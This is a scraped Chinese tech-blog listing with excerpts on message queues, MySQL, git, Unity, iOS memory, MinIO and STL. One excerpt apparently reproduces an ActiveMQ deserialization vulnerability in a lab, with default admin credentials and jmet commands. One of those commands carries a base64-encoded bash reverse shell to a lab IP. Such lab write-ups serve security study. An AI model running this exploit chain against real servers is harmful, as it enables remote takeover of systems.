如果是 RocketMQ，很多问题都是类似的，可以从以下的问题出发进行考察：
RocketMQ 和 ActiveMQ 有哪些区别？
为什么 RocketMQ 不会丢失消息？
RocketMQ 的事务消息都有哪些应用？
RocketMQ 是怎么保证系统高可用的？
这些问题中一部分可以在专栏中找到思路，但大部分的问题还要靠你在平时多积累与思考，比如消息队列的高可用，你可以多机器部署，防止单点故障；主从结构复制，通过消息冗余防止消息丢失；消息持久化，磁盘写入的 ACK 等角度进行分析。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d59b70b993e64c1a0f355b38d761d63f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7996301076b4d8b588b88eebd85152e9/" rel="bookmark">
			mysql 隔离级别和可重复读啥意思
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		MySQL支持的隔离级别有四种，分别是：
Read Uncommitted（读未提交）
Read Committed（读已提交）
Repeatable Read（可重复读）
Serializable（串行化）
这些隔离级别是为了解决事务并发时可能出现的问题，如脏读、不可重复读和幻读。以下是每个隔离级别的简要描述：
Read Uncommitted（读未提交）
这是最低的隔离级别。在此隔离级别下，一个事务可以读取另一个尚未提交的事务的数据。这可能导致脏读、不可重复读和幻读。
Read Committed（读已提交）
这是默认的隔离级别。只能读取已提交的数据，避免了脏读。但仍然可能出现不可重复读和幻读。
Repeatable Read（可重复读）
在此隔离级别下，同一个事务的多次读取将看到相同的数据行。这避免了脏读和不可重复读，但仍然可能出现幻读。
Serializable（串行化）
这是最高的隔离级别。它通过强制事务串行执行，避免了脏读、不可重复读和幻读。但这也可能导致性能下降，因为事务需要等待其他事务完成才能执行。
在MySQL中，可以通过设置SET TRANSACTION ISOLATION LEVEL来改变当前会话的隔离级别。需要注意的是，MySQL的InnoDB存储引擎默认使用Repeatable Read作为隔离级别，而MyISAM存储引擎默认使用Read Committed。
MySQL中的可重复读（Repeatable Read）是事务的隔离级别之一。在这个隔离级别下，同一个事务的多次读取将看到相同的数据行，避免了脏读和不可重复读，但仍然可能出现幻读。
以下是一个MySQL可重复读的例子：
-- 开启一个事务START TRANSACTION;
-- 设置隔离级别为可重复读
SET TRANSACTION ISOLATION LEVEL REPEATABLE READ;
-- 执行一些SQL操作，例如插入、更新或删除数据
INSERT INTO table_name (column1, column2) VALUES ('value1', 'value2');
UPDATE table_name SET column1 = 'new_value' WHERE column2 = 'value2';
DELETE FROM table_name WHERE column1 = 'value1';
-- 提交事务COMMIT;
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7996301076b4d8b588b88eebd85152e9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5ce3f670119f49e0a4c663bffe1b93fa/" rel="bookmark">
			Apache-ActiveMQ 反序列化漏洞(CVE-2015-5254)复现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		CVE-2016-3088
一、环境搭建
Java:jdk8
影响版本 Apache ActiveMQ &lt; 5.13.0 二、用docker搭建漏洞环境
访问一下web界面
然后进入admin目录登录
账号:admin
密码:admin
三、工具准备
cd /opt
wget https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar
mkdir external
注意：一定要下载external，否则会报错
四、测试漏洞存在
java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "touch /tmp/sucess" -Yp ROME 8.210.152.234（靶机IP，下图说是自己的ip是错误的） 61616
点击触发命令执行
查看一下目录，发现创建成功
五、getshell
首先借用一个网站对payload进行处理，网址我以前的文章复现有提到。
java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIxNy4xMjgvOTk5OSAwPiYxIA==}|{base64,-d}|{bash,-i}" 192.168.217.128 61616
最后点击它，触发命令执行
如上图所示即反弹shell成功！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4b0877637efa4529817d21eb7cff97fe/" rel="bookmark">
			git reset和git revert
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		git reset和git revert详解 背景 程序员在编码开发提交代码的时候，经常会出现需要回退、回撤代码的情况，比如某个功能延期了，需要回退某个功能提交的代码，遇到这种情况的时候发现有不少工作很多年的程序员都不太清楚怎么处理，这也是令我有点意外的，为了更好的帮助哪些不了解怎么进行代码回退或者代码撤销的新老程序员，特意写了这篇文章，希望对大家有所帮助。遇到这种情况，我们今天的主角git reset和git revert就可以派上用场了。
git reset 详解 git reset命令的作用是将指定提交之后的内容从当前分支中移除，并将HEAD指针移动到指定提交，同时将当前分支指针移动到指定提交，并将之后的提交从历史中移除。
使用示例 # 回退到指定版本
git reset &lt;commit-hash&gt;
# 等同于 `git reset &lt;commit-hash&gt;`, `&lt;commit-hash&gt;`之后的提交内容都会保留到工作区
git reset --mixed &lt;commit-hash&gt;
# `&lt;commit-hash&gt;`之后的提交内容会保留到暂存区，但是工作区不会改变
git reset --soft &lt;commit-hash&gt;
# `&lt;commit-hash&gt;`之后的提交内容都不会被保留，直接被移除掉了
git reset --hard &lt;commit-hash&gt;
# 回退到上一个版本
git reset HEAD^
# 回退到上两个版本
git reset HEAD~2
常用选项 git reset -h
usage: git reset [--mixed | --soft | --hard | --merge | --keep] [-q] [&lt;commit&gt;]
or: git reset [-q] [&lt;tree-ish&gt;] [--] &lt;paths&gt;.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4b0877637efa4529817d21eb7cff97fe/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a6c075867d682d1564bd4ad2878d10e8/" rel="bookmark">
			unity学习笔记----游戏练习02
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、阳光值的展示和消耗
1.创建一个文本组件用于显示阳光的数值，然后在脚本中得到这个UI。
在SunManger中得到这个组件的引用
public TextMeshProUGUI sunPointText;
写一个用于更新显示的方法
public void UpdataSunPointText()
{
sunPointText.text = sunPoint.ToString();
}
2.写一个方法用于阳光值的消耗
public void SubSun(int Point)
{
sunPoint -= Point;
UpdataSunPointText();
}
二、开发能种植的植物
1.向日葵
将向日葵的素材全选拖拽到场景中会自动生成帧动画。保存后会生成：
一个是动画，一个是状态机。
添加一个脚本用于管理所有的植物。
对于每个植物都有两个状态，禁用和可用。再根据不同状态做不同的处理。
switch (plantState)
{
case PlantState.Disable:
DisableUpdata();
break;
case PlantState.Enable:
EnsableUpdata();
break;
default:
break;
}
其中方法的具体实现在后续补充。
现在CardControl脚本中新增一个枚举，用于在我们点击的卡片槽来区分不同的植物，
public enum PlantType
{
Sunflower,
PeaShooter
}
再提供一个公共的属性方便再外面修改
public PlantType plantType = PlantType.Sunflower;
这里要保证枚举的访问性要大于或等于属性的访问性。
当我们点击卡片的时候是要通过预制体去生成对应的植物，然后放在对应的格子上。因此对于每一个植物我们也需要去知道是什么类型的，因此在PlantManager脚本中也需要去声明对应的枚举属性。
public PlantType plantType = PlantType.Sunflower;
这样卡片的类型就和预制体上的类型一一对应上了。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a6c075867d682d1564bd4ad2878d10e8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/172f94ea0dfed849e2f135b22a1c6466/" rel="bookmark">
			Ps：混合颜色带 - 基础篇
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		混合颜色带 Blend If是“图层样式”对话框中的一个高级功能，允许根据下方图层或当前图层的色彩信息来混合图层，无需进行复杂的选区或蒙版操作。
混合颜色带是基于亮度（灰色）或颜色通道的特定范围来显示或隐藏图层的特定区域。
“当前图层” Current Layer，可根据当前图层的亮度值来隐藏该图层中的像素。
“下一图层” Underlying Layer，可根据下方所有图层的复合图像的亮度值来显示下方图层的像素。
经过混合颜色带的调整，Photoshop 画布上的图像将混合显示出当前选中图层中的哪些像素以及其下方的可见图层中的哪些像素。
比如，可以去除当前选中图层中的暗部像素，或强制下方图层中的亮部像素显示出来。
还可以定义部分混合像素的范围，在混合区域和非混合区域之间产生一种平滑的过渡效果。
尽管混合颜色带本身就是一个强大的工具，但有时与蒙版结合使用可以实现更加精细的控制。
◆ ◆ ◆
使用及选项说明
使用“当前图层”和“下一图层”滑块来设置混合像素的亮度范围，度量范围从 0 到 255。
拖动白色滑块设置亮度范围的高值，拖动黑色滑块设置亮度范围的低值。
按住 Alt 键拖动滑块三角形的一半，可定义混合像素的容差范围，可使得混合过渡更加平滑。
混合颜色带（通道） Channel
用于选择通道，默认为“灰色” Gray，即，基于图像的亮度进行混合，还可基于原色通道进行混合。
比如，在 RGB 颜色模式下，可以选择红 Red、绿 Green、蓝Blue等通道，以指定基于单个原色通道的混合，其本质也是基于原色通道的亮度信息进行混合。
当前图层
Current Layer
此选项控制当前选中的图层要隐藏的像素范围。
白色滑块代表亮部，黑色滑块代表暗部。
如下图所示，当前图层色阶值为 85 以下的像素将被隐藏。
即，当前图层仅显示出色阶值在 85 ~ 255 之间的像素。
再如下图所示，当前图层色阶值为 203 以上的像素将被隐藏。
即，当前图层仅显示出色阶值在 0 ~ 203 之间的像素。
又比如下图，当前图层色阶值为 75 以下、179 以上的像素将被隐藏。
即，当前图层仅显示色阶值在 75 ~ 179 之间的像素。
下一图层
Underlying Layer
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/172f94ea0dfed849e2f135b22a1c6466/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f84642650988f1b5d615bf981d5d6da0/" rel="bookmark">
			uni-app绘制二维码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在uni-app中绘制二维码，可以按照以下步骤进行：
打开HBuilderX开发工具，新建一个uni-app项目。在pages文件夹下，新建一个user文件夹，并创建user.vue文件。在template标签中，插入多个view和canvas。导入生成二维码的js文件，然后进行调用。保存代码并使用微信开发者工具进行编译运行，进入到微信开发者工具。在微信小程序开发工具中，进行编译，修改配置路径，然后查看模拟器效果。 以下是一个简单的uni-app绘制二维码的代码示例：
&lt;template&gt; &lt;view class="container"&gt; &lt;canvas canvas-id="qrcodeCanvas" style="width: 300px; height: 300px;"&gt;&lt;/canvas&gt; &lt;/view&gt; &lt;/template&gt; &lt;script&gt; export default { data() { return { qrcodeData: "https://www.example.com", // 二维码数据 qrcodeWidth: 300, // 二维码宽度 qrcodeHeight: 300 // 二维码高度 }; }, onReady() { this.drawQRCode(); }, methods: { drawQRCode() { const ctx = uni.createCanvasContext('qrcodeCanvas'); const qrcode = new QRCode(ctx, { text: this.qrcodeData, width: this.qrcodeWidth, height: this.qrcodeHeight, color: "#000" // 前景色 }); ctx.draw(); } } }; &lt;/script&gt; 在这个示例中，我们首先在模板中定义了一个canvas元素，并指定了其id为"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f84642650988f1b5d615bf981d5d6da0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fcc482110ad94e4962e61b89f42a8941/" rel="bookmark">
			从计算机内存结构到iOS
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、冯.诺伊曼结构 当前计算机都是冯.诺伊曼结构（Von Neumann architecture），是指存储器存放程序的指令以及数据，在程序运行时根据需要提供给CPU使用。
冯.诺伊曼瓶颈 在目前的科技水平之下，CPU与存储器之间的读写速率远远小于CPU的工作效率，造成了CPU性能的浪费。当前解决方式是采用多级存储，来平衡存储器的读写速率、容量、价格。
存储器主要分为两类：易失性存储器速度更快，断电后数据会丢失；非易失性存储器容量更大、价格更低，断电也不会丢失数据。随机访问存储器RAM也分为两类，其中SRAM速度更快，所以用作高速缓存，DRAM用作主存。只读存储器ROM实际上只有最开始的时候是只读的，后来随着发展也能够进行读写了，只是沿用了之前的名字。
局部性原理（Principle of locality）：被使用过的存储器内容可能会在未来多次使用，以及它附近的内容也大概率被使用。当我们把这些内容放在高速缓存中，那么就可以在部分情况下节约访问存储器的时间。
二、CPU寻址 物理地址 内存可以被看作是一个数组，数组元素是一个字节大小的空间，而数组索引则是所谓的物理地址（Physical Address）。CPU直接通过物理地址去访问对应的内存叫做物理寻址。物理寻址拓展了分段机制，通过在CPU中增加段寄存器，将物理地址变成了“段地址”：“段内偏移量”的形式，增加了物理寻址的寻址范围。
虚拟寻址 CPU通过访问虚拟地址（Virtual Address），经过翻译获得物理地址，才能访问内存。这个翻译过程由CPU中的内存管理单元（Memory Management Unit）MMU完成。
虚拟内存 对于每个进程来说，操作系统可以为其提供一个独立的、私有的、连续的地址空间，这就是所谓的虚拟内存。它保护了进程的地址空间，使得进程之间不能够越权进行互相地干扰。对于每个进程来说，操作系统通过虚拟内存进行“欺骗”，进程只能够操作被分配的虚拟内存的部分。与此同时，进程可见的虚拟内存是一个连续的地址空间，方便了程序员对内存进行管理。
虚拟内存可以映射到物理内存以及硬盘的任何区域。由于硬盘读写速度不如内存快，所以操作系统会优先使用物理内存，当物理内存空间不足时，就会将部分内存数据交换到硬盘上去存储，这就是所谓的Swap内存交换机制。相比于物理寻址，虚拟寻址利用了硬盘空间拓展了内存空间。
虚拟内存保护了每个进程的地址空间、简化了内存管理、利用硬盘空间拓展了内存空间。
内存分页 虚拟内存和物理内存建立了映射关系，为了方便映射和管理，虚拟内存和物理内存都被分割成相同大小的单位，物理内存的最小单位被称为帧（Frame），虚拟内存的最小单位被称为页（Page）。
支持了物理内存的离散使用，虚拟内存对应的物理内存可以任意存放，方便了操作系统对物理内存的管理，能够最大化利用物理内存。
三、iOS内存机制 使用虚拟内存机制，内存有限，单应用可用内存大。
iOS系统给每个进程分配的虚拟内存足够大，移动设备通常使用的大容量存储器是闪存（Flash），读写速度远远小于电脑的硬盘，所以iOS不支持内存交换机制。
内存警告：当内存不够用时，iOS的处理是会发出内存警告，告知进程去清理自己的内存didReceiveMemoryWarning。
OOM崩溃：如果进程发生了内存警告并清理了之后，物理内存还是不够就会发生Out of Memory Crash。
iOS是一个从BSD衍生而来的系统，其内核是Mach。其中内存警告以及OOM崩溃的处理机制就是Jetsam机制，也被称为Memorystatus。Jetsam会始终监控内存整体使用情况，当内存不足时会根据优先级、内存占用大小杀掉一些进程，并记录成JetsamEvent。
内核会调起一个内核优先级最高的线程：
维护两个列表，一个是基于优先级的进程列表，另一个是每个进程消耗的内存页的列表。与此同时，它会监听内核pageout线程对整体内存使用情况的通知，在内存告警时向每个进程转发内存警告didReceiveMemoryWarning；杀掉进程触发OOM主要是通过memorystatus_kill_on_VM_page_shortage，有同步和异步两种方式，同步会立刻杀掉进程，先根据优先级杀掉低优先级的进程，同一优先级根据内存大小杀掉内存占用大的进程；异步只会标记当前进程，通过专门的内存管理线程去杀死。
iOS系统的内存占用（Memory Footprint） 内存分页分为clean memory、dirty memory，iOS还有compressed memory。
clean memory在iOS中是定义为可被重新创建的内存，所有不属于clean memory的内存都是dirty memory，dirty memory不能被重新创建，所有会始终占据物理内存，直到物理内存不够用之后，系统便会开始清理。当物理内存不够用时，iOS会将部分物理内存压缩，需要读写时再解压，已达到节约内存的目的，压缩后的内存就是compressed memory。
NSCache相对于NSDictionary不仅线程安全，而且对存在compressed memory情况下的内存警告做了优化，可以由系统自动释放内存。
进程内部的内存管理 代码区、常量区、静态区由系统自动加载，在进程结束之后被系统释放。
栈区一般存放局部变量、临时变量，由编译器自动分配和释放，每个线程对应一个栈。
堆区用于动态内存的申请，由程序员控制和释放。
栈区由系统托管，速度更快，但是使用不如堆区灵活。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/87db0874e45b1d9e74aa2bca0309c9c6/" rel="bookmark">
			ffmpeg两种windows版本区别说明
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		版本一 必须拷贝exe和dll文件才能使用，如果缺少dll则exe不正正常执行
如果缺少dll ，执行 exe会报错如下 版本2 直接拷贝exe就能使用，没有依赖的环境
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aad6cf0a6c3a7893b441ad390b575ab8/" rel="bookmark">
			（2023|ACM，风格迁移，调制网络，内容和风格正则化）ControlStyle：使用扩散先验生成文本驱动的风格化图像
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		ControlStyle: Text-Driven Stylized Image Generation Using Diffusion Priors
公众：EDPJ（添加 VX：CV_EDPJ 或直接进 Q 交流群：922230617 获取资料）
目录
0. 摘要
1. 方法
1.1 背景
1.2 ControlStyle
1.3 扩散正则化
1.4 训练
2. 结果
S. 总结
S.1 主要贡献
S.2 架构和方法
0. 摘要 最近，多媒体社区目睹了在大规模多模态数据上训练的扩散模型的崛起，特别是在文本到图像生成领域。在这篇论文中，我们提出了一个新的任务，即 “文本驱动的艺术风格图像生成”，以进一步提高内容创作的可编辑性。给定输入文本提示和风格图像，该任务旨在生成既在语义上与输入文本提示相关，同时又在风格上与风格图像一致的艺术风格图像。为了实现这一目标，我们提出了一个新的扩散模型（ControlStyle），通过升级一个预训练的文本到图像模型，配备一个可训练的调制网络，使其能够处理更多的文本提示和风格图像条件。此外，同时引入了扩散风格和内容正则化，以促进学习这个调制网络，利用这些扩散先验，追求高质量的艺术风格文本到图像生成。大量实验证明了我们的 ControlStyle 在生成更具视觉吸引力和艺术性的结果方面的有效性，超过了简单组合文本到图像模型和传统风格转移技术。
1. 方法 一个传统的文本驱动艺术风格图像生成的解决方案是简单地级联一个预训练的文本到图像扩散模型（文本⇒内容图像）和一个传统的风格迁移技术（内容图像 + 风格图像⇒风格化图像）。然而，这种两阶段方法未充分利用扩散模型中固有的图像先验来进行内容创作，同时忽略了内容图像生成与风格化过程之间的交互作用。为了缓解这些问题，我们提出了一个新的框架，即 ControlStyle，这是一个升级的扩散模型，配备一个可训练的调制网络，共同实现了对文本提示和风格图像的多重条件。
1.1 背景 扩散概率模型（Diffusion probabilistic model，DDPM）：
随机噪声 x_T ∼ N(0, I)。
潜在扩散模型（Latent Diffusion Model，LDM）：
图像 x 由编码器映射到潜在空间 Z 的潜在编码 z，最终由译码器映射回图像。 1.2 ControlStyle 为了追求高质量的文本驱动艺术风格图像生成，我们设计了 ControlStyle，将文本到图像生成和图像风格化统一到一个端到端的框架中。请注意，这里我们使用公开发布的稳定扩散作为预训练的文本到图像扩散模型，以提高训练效率和可重复性。简而言之，稳定扩散包括一个自动编码器，一个文本编码器和一个 U-Net [34]，分别用于图像编码/解码（512 × 512 ⇔ 64 × 64）、文本编码和噪声预测。受到 ControlNet [44] 的启发，ControlStyle 被设计为使用可训练的调制网络对预训练的稳定扩散模型进行风格化。调制网络利用输入文本 𝑐_𝑡𝑒𝑥𝑡，风格图像 𝑐_𝑠𝑡𝑦𝑙𝑒 以及噪声潜在编码 𝑧_𝑡 来生成既在结构上又在语义上与输入相关的风格特征。这些风格特征被用来调制预训练的稳定扩散模型，以实现文本驱动的艺术风格图像生成。在学习过程中，仅训练调制网络，而不调整预训练稳定扩散模型的参数，以保留从数十亿的图像文本数据中学到的强大文本到图像的能力。 具体而言，可训练的调制网络是从稳定扩散中的 U-Net 的编码器和中间块初始化的，并通过零卷积层连接到 U-Net 的解码器块。值得一提的是，零卷积层是一种特殊的卷积层，其权重和偏置初始化为零。在整个训练过程中，这些层的参数逐渐从零过渡到优化的值，以避免过拟合。以一个只有一个神经网络块的简单预训练模型 𝑓(·) 为例，输出可以表示为：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/aad6cf0a6c3a7893b441ad390b575ab8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2fea3112302bc39b46201eb7adcc101f/" rel="bookmark">
			docker搭建minio集群，集群分享文件URL踩坑问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、环境准备
3台机器，Ip地址依次为IP1,IP2,IP3 二、设置服务器时间同步
Minio集群需要各个节点的时间保持同步，使用NTP作为时间同步服务，这里以Minio-1（IP1）为上游服务器，其它2个节点为下游服务器，做时间节点同步
1、Minio-1 服务器安装NTP
（1）安装ntp
yum install ntp ntpdate –y （2） 启动ntp服务
systemctl start ntpd （3）服务端修改配置文件 /etc/ntp.conf
server 127.127.1.1 fudge 127.127.1.1 stratum 10 （4）重启ntp服务
systemctl restart ntpd （5）查看ntp状态
ntpq -p （6）设置开机启动
systemctl enable ntpd 2、其它下游服务器做时间同步，Minio-2(IP2)、Minio-3(IP3) 以下操作需要在所有下游服务器操作
（1）安装ntp
yum install ntp ntpdate –y （2）手动同步一次时间
/usr/sbin/ntpdate -u IP1 （3）修改配置文件（/etc/ntp.conf）
restrict IP1 nomodify notrap noquery server IP1 fudge IP1 stratum 10 （4）启动ntp服务
systemctl start ntpd （5）设置开机启动
systemctl enable ntpd （6）查看状态
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2fea3112302bc39b46201eb7adcc101f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ff4321f3a840191ed621d75fda126e73/" rel="bookmark">
			基于人工势场法的航线规划
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		MATLAB2016b可以运行
基于人工势场法的航线规划资源-CSDN文库
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/164f5cdeae05b51558b15b9a1bb2434e/" rel="bookmark">
			基于遗传算法的航线规划
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		MATLAB2016b可以正常运行
基于遗传算法的无人机航线规划资源-CSDN文库
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1b46d512516d0daf8127e0366f686ce8/" rel="bookmark">
			STL——list容器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1.list基本概念
2.list构造函数
3.list赋值和交换
4.list大小操作
5.list插入和删除
6.list数据存取
7.list反转和排序
8.排序案例
1.list基本概念 功能：将数据进行链式存储。
链表（list）是一种物理存储单元上非连续的存储结构，数据元素的逻辑顺序是通过链表中的指针链接实现的。
链表的组成：链表由一系列结点组成。
结点的组成：一个是存储数据元素的数据域，另一个是存储下一个结点地址的指针域。
STL中的链表是一个双向循环链表。
由于链表的存储方式并不是连续的内存空间，因此链表list中的迭代器只支持前移和后移，属于双向迭代器。 list的优点：
采用动态存储分配，不会造成内存浪费和溢出链表执行插入和删除操作十分方便，修改指针即可，不需要移动大量元素 list的缺点：
链表灵活，但是空间（指针域）和时间（遍历）额外耗费较大 注：list有一个重要的性质，插入和删除操作都不会造成原有的list迭代器失效，这在vector容器是不成立的。 2.list构造函数 函数原型：
list&lt;T&gt; lst; ——//list采用采用模板类实现,对象的默认构造形式。list(beg,end); ——//构造函数将[beg, end)区间中的元素拷贝给本身。list(n,elem); ——//构造函数将n个elem拷贝给本身。list(const list &amp;lst); ——//拷贝构造函数。 #include&lt;iostream&gt; using namespace std; #include&lt;list&gt; void printList(list&lt;int&gt;&amp;l) { for (list&lt;int&gt;::iterator it = l.begin(); it != l.end(); it++) { cout &lt;&lt; *it &lt;&lt; " "; } cout &lt;&lt; endl; } //list构造函数 void test01() { //创建list容器 list&lt;int&gt;l1;//默认构造 //添加数据 l1.push_back(10); l1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1b46d512516d0daf8127e0366f686ce8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/05f7109e2291acd023903a0166cdec32/" rel="bookmark">
			[每周一更]-(第44期)：GIT版本控制之忽略文件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		基础概念 在 Git 中，可以通过 .gitignore 文件来指定不需要纳入版本控制的文件或文件夹，这些被忽略的文件或文件夹不会被提交到仓库中。
在项目根目录下创建一个名为 .gitignore 的文件，并在其中列出需要忽略的文件或文件夹。一些常见的示例：
# 忽略所有 .a 文件 *.a # 但是要跟踪 lib.a，即使之前忽略了所有 .a 文件 !lib.a # 忽略所有 .txt 文件 *.txt # 忽略 doc/ 目录下的所有文件 doc/ # 仅仅忽略 doc/notes.txt 文件 doc/notes.txt # 忽略 build/ 目录下的所有文件夹 build/*/ # 忽略 doc/build/ 目录下的所有文件 doc/build/* # 忽略文件名为 README.md 的文件 README.md # 忽略所有扩展名为 .log 的文件 *.log 在 .gitignore 文件中使用 # 符号开头的行表示注释，这些行会被 Git 忽略。
使用 ! 符号可以取消忽略，例如在上面的示例中取消忽略了 lib.a 文件。
需要注意的是，.gitignore 文件只能忽略尚未被 Git 跟踪的文件。如果文件已经被纳入版本控制中，那么 .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/05f7109e2291acd023903a0166cdec32/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b2293bfeef44041dc53151ae0fffca7f/" rel="bookmark">
			STL——queue容器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.queue基本概念 概念：queue是一种先进先出（First In First Out,FIFO）的数据结构，它有两个出口。
队列容器允许从一端新增元素，从另一端移除元素。
队列中只有队头和队尾才可以被外界使用，因此队列不允许有遍历行为。
队列中进数据称为——入队（push）
队列中出数据称为——出队（pop）
2.queue常用接口 构造函数：
queue&lt;T&gt; que;—— //queue采用模板类实现，queue对象的默认构造形式queue(const queue &amp;que); ——//拷贝构造函数 赋值操作：
queue&amp; operator=(const queue &amp;que); ——//重载等号操作符 数据存取：
push(elem); ——//往队尾添加元素pop();—— //从队头移除第一个元素back(); ——//返回最后一个元素front(); ——//返回第一个元素 大小操作：
empty(); ——//判断堆栈是否为空size();—— //返回栈的大小 #include&lt;iostream&gt; using namespace std; #include&lt;queue&gt; class Person { public: Person(string name, int age) { this-&gt;m_name = name; this-&gt;m_age = age; } string m_name; int m_age; }; //队列queue容器 void test01() { queue&lt;Person&gt;q; //创建数据 Person p1("唐僧", 50); Person p2("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b2293bfeef44041dc53151ae0fffca7f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ceeb5b6d76a1b2e6860b61f18043bba2/" rel="bookmark">
			在微服务中如何实现全链路的金丝雀发布？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1. 什么金丝雀发布？它有什么用？
2.如何实现全链路的金丝雀发布
2.1 负载均衡模块
2.2 网关模块
2.3 服务模块
2.3.1 注册为灰色服务实例
2.3.2 设置负载均衡器
2.3.3 传递灰度发布标签
2.4 其他代码
2.4.1 其他业务代码
2.4.2 pom.xml 关键代码
2.4.3 application.yml 相关代码
3. 验证全链路金丝雀发布的实现效果
1. 什么金丝雀发布？它有什么用？ 金丝雀发布(Canary Release,也称为灰度发布)是指在软件或服务发布过程中，将新版本的功能或服务以较小的比例引入到生产环境中，仅向部分用户或节点提供新功能的一种发布策略。
而在传统的全量发布中，新版本将会立即部署到所有用户或节点上。金丝雀发布的核心思想是逐步推进，监测新版本的稳定性和性能，以确保在全面发布之前能够解决潜在的问题。
假设某款在线多人游戏决定上线一个全新的多人模式功能。在传统的全量发布中，它会将这个新功能立即部署到所有玩家的游戏客户端中，然后在全面发布后等待用户的反馈。而使用金丝雀发布，它的发布流程就变成了这样：
内测阶段：
游戏开发团队首先将新多人模式功能引入到游戏的内测版本中，但仅向少数特定的内测玩家提供。这些内测玩家是经过筛选或自愿参与的，他们了解可能会遇到问题，并愿意分享反馈。内测玩家可以在一定时间内使用新功能，并向开发团队报告问题、提供建议和反馈意见。 监测和改进：
游戏开发团队密切关注内测玩家的游戏体验、性能和稳定性。如果在内测期间发现了问题，团队可以及时进行修复和改进，并确保新功能在全面发布前达到高质量标准。 逐步扩展：
在确认新功能在内测阶段表现良好后，开发团队逐步扩展金丝雀发布的范围。他们可以将新功能提供给更多的玩家，但仍然限制在一小部分，比如10%的玩家。这一阶段被称为金丝雀发布的初期阶段，新功能仅对一小部分用户可见。 全面发布：
在经过一系列逐步扩展和监测后，开发团队最终将新多人模式功能发布给了所有玩家。此时，新功能已经通过了多轮测试和改进，用户体验较好，且潜在问题得到了解决。 从上述游戏上线新功能的金丝雀发布流程中能看出，金丝雀发布相比传统的全量发布有以下好处：
逐步引入新功能，降低全面发布的风险。及时获取内测玩家的反馈，加速问题的修复。确保新功能在全面发布时达到高质量标准。提供更好的用户体验，减少潜在问题对所有用户的影响。 2.如何实现全链路的金丝雀发布 Spring Cloud 全链路金丝雀发布的实现思路图如下：
金丝雀发布的具体实现步骤大致分为以下几步：
